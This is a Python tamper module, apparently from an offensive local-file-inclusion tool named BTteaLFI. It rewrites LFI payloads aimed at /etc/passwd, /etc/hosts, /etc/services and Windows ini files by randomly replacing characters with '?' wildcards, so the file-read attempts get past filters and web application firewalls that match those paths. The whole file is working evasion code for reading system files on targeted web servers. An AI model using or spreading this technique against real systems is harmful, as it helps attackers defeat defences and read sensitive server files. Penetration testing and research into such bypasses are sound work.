# BTteaLFI
# Copyright (C) 2024-2025 BTtea
#
# This file is licensed under GPLv2. See LICENSE.txt for details.

from random import sample

# page=/etc/passwd  =>  page=/?t?/p?s??d

def random_question_marks(s:str,count:int) -> str:
    # 隨機選擇 count 個位置
    positions = sample(range(len(s)), count)
    # 轉為 list 方便修改
    chars = list(s)
    # 將選到的位置替換為 '?'
    for pos in positions:
        chars[pos] = '?'
    return ''.join(chars)

def tamper(payload:str):
    if payload:
        new_payload=''
        tmp=''
        if '/etc/passwd' in payload:
            tmp='/etc/passwd'
            new_payload=f"/{random_question_marks('etc',2)}/{random_question_marks('passwd',3)}"
        elif '/etc/hosts' in payload:
            tmp='/etc/hosts'
            new_payload=f"/{random_question_marks('etc',2)}/{random_question_marks('hosts',2)}"
        elif '/etc/services' in payload:
            tmp='/etc/services'
            new_payload=f"/{random_question_marks('etc',2)}/{random_question_marks('services',4)}"
        elif 'C:/Windows/win.ini' in payload:
            tmp='C:/Windows/win.ini'
            new_payload=f"C:/{random_question_marks('Windows',4)}/{random_question_marks('win',1)}.{random_question_marks('ini',1)}"
        elif 'C:/Windows/system.ini' in payload:
            tmp='C:/Windows/system.ini'
            new_payload=f"C:/{random_question_marks('Windows',4)}/{random_question_marks('system',2)}.{random_question_marks('ini',1)}"
        if new_payload:
            payload=payload.replace(tmp,new_payload)
    return payload


